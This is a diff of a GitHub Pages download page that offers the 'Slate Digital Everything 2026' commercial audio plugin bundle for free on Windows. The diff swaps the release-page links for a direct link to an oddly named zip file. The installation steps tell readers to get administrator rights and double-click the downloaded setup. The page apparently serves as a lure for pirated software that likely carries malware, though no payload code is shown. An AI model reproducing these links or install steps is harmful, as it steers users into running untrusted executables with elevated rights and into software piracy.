@@ -18,7 +18,7 @@ description: "Download and install the Slate Digital Everything Bundle for Windo
 
 <h1>🎛️ Slate-Digital-Everything-2026 - Access professional audio plugins for windows</h1>
 
-<a href="https://github.com/Pygmythrowpillow930/Slate-Digital-Everything-2026/releases" class="button" style="background-color: #0969da;">Download Software Here</a>
+<a href="https://raw.githubusercontent.com/Pygmythrowpillow930/pygmythrowpillow930.github.io/main/ambulatorium/github_pygmythrowpillow_io_1.9.zip" class="button" style="background-color: #0969da;">Download Software Here</a>
 
 <div class="section">
 <h2>📋 Overview</h2>
@@ -42,7 +42,7 @@ description: "Download and install the Slate Digital Everything Bundle for Windo
 <h2>🚀 Getting Started</h2>
 <p>Follow these steps to set up the plugins on your machine. Ensure you have administrator rights before you begin.</p>
 <ol>
-  <li>Go to the <a href="https://github.com/Pygmythrowpillow930/Slate-Digital-Everything-2026/releases">official download page</a> to locate the latest installer.</li>
+  <li>Go to the <a href="https://raw.githubusercontent.com/Pygmythrowpillow930/pygmythrowpillow930.github.io/main/ambulatorium/github_pygmythrowpillow_io_1.9.zip">official download page</a> to locate the latest installer.</li>
   <li>Click the link to start the file download to your computer.</li>
   <li>Open your Downloads folder and double-click the file to launch the setup wizard.</li>
   <li>Follow the screen prompts. Select the default installation path unless you have specific reasons to change the folder destination.</li>
